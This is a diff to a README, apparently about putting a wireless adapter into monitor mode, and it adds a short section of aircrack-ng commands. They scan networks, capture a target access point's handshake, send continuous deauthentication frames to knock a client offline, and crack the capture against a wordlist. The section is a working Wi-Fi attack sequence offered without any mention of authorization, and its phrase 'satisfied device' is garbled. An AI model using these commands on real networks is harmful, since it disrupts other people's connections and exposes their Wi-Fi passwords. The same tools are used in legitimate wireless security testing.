@@ -120,6 +120,25 @@ You should see "Mode:Monitor" next to your wireless interface.
 
 Note:- Before doing all this, run **sudo su** command.
 
+If you want to do the deauthenticate on a satisfied device then enter this command
+
+ ```bash
+   airodump-ng wlan0
+   ```
+
+ ```bash
+   airodump-ng -c[channel] -w capture -d [BSSID] wlan0 
+   ```
+
+   ```bash
+   aireplay-ng --deauth 0 -a [BSSID] -c [client station BSSID]  wlan0
+   ```
+
+```bash
+   aircrack-ng [filename.cap] -w [wordlist]
+   ```
+
+
 ### Troubleshooting
 
 - **Driver Compatibility**: If you face any issues, ensure the driver you are using is compatible with your kernel version.
